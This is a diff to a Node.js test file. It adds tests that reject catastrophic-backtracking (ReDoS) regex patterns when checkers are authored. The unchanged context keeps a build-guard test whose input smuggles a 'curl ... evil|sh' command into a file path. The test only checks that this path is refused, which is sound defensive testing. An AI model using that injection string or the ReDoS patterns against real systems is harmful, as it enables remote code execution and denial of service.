@@ -5,7 +5,7 @@
 import assert from 'node:assert';
 import {
   safeArith, runCheckers, upsertPersona, upsertCommand, compilePersona,
-  compileCommand, templateSchema, toolSchema, listPersonas, deletePersona,
+  compileCommand, templateSchema, toolSchema, listPersonas, deletePersona, unsafeRegex,
 } from '../server/src/personas.js';
 import { _testInternals as ROUT } from '../server/src/routines.js';
 import { _testInternals as AUTH } from '../server/src/auth.js';
@@ -214,6 +214,24 @@ test('build guard — shell-metacharacter path is rejected (RCE attempt fails cl
   const msgs = [];
   runBuild('/root/p;curl${IFS}evil|sh', (m) => msgs.push(m));
   assert.ok(msgs.some((m) => m.t === 'build.err'), 'metachar path must be rejected, never spawned');
+});
+
+// ── ReDoS guard: catastrophic-backtracking regexes are rejected at authoring ──
+test('unsafeRegex flags nested quantifiers (ReDoS shapes)', () => {
+  for (const bad of ['(a+)+', '(a*)*', '(a+)*$', '((ab)+)+', '(\\d+)+', '(a+)+b']) {
+    assert.equal(unsafeRegex(bad), true, `should flag ${bad}`);
+  }
+});
+test('unsafeRegex allows normal patterns', () => {
+  for (const ok of ['^\\d{3}-\\d{4}$', 'foo|bar', 'a+b*c?', '[a-z]+@[a-z]+', '(abc)+', '^v\\d+$']) {
+    assert.equal(unsafeRegex(ok), false, `should allow ${ok}`);
+  }
+});
+test('a checker with a catastrophic regex is REFUSED at authoring (hard error)', () => {
+  assert.throws(() => upsertCommand({
+    name: 'REDOS_TEST', fields: [{ name: 'f', type: 'string' }],
+    checkers: [{ kind: 'regex', field: 'f', pattern: '(a+)+$' }],
+  }), /ReDoS|nested quantifier|invalid checker/i);
 });
 
 // ── OS-sandbox opt-in (ATLAN_SANDBOX) ──
